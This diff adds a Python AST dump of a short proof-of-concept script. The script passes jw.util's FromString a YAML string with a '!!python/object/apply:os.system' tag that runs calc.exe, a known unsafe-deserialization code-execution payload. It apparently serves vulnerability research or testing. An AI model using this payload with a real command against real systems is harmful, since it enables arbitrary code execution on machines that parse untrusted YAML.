@@ -1,0 +1,22 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='jw.util')]),
+        Assign(
+            targets=[
+                Name(id='yaml_config', ctx=Store())],
+            value=Constant(value="\ntest: !!python/object/apply:os.system ['calc.exe']\n")),
+        Expr(
+            value=Call(
+                func=Attribute(
+                    value=Attribute(
+                        value=Name(id='jw', ctx=Load()),
+                        attr='util',
+                        ctx=Load()),
+                    attr='FromString',
+                    ctx=Load()),
+                args=[
+                    Name(id='yaml_config', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
